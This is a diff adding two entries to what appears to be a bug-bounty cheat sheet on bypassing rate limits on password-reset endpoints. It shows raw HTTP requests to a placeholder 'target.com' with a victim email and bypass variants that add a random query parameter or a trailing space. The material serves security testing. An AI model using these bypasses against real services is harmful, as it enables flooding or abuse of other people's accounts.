@@ -45,3 +45,37 @@ Cookie: aaaaaaaaaaaaa
 
 email=victim@gmail.com
 ```
+
+4. Add a random parameter on the last endpoint
+```
+POST /ForgotPass.php HTTP/1.1
+Host: target.com
+[...]
+
+email=victim@gmail.com
+```
+Try this to bypass
+```
+POST /ForgotPass.php?random HTTP/1.1
+Host: target.com
+[...]
+
+email=victim@gmail.com
+```
+
+5. Add space after the parameter value
+```
+POST /api/forgotpass HTTP/1.1
+Host: target.com
+[...]
+
+{"email":"victim@gmail.com"}
+```
+Try this to bypass
+```
+POST /api/forgotpass HTTP/1.1
+Host: target.com
+[...]
+
+{"email":"victim@gmail.com "}
+```
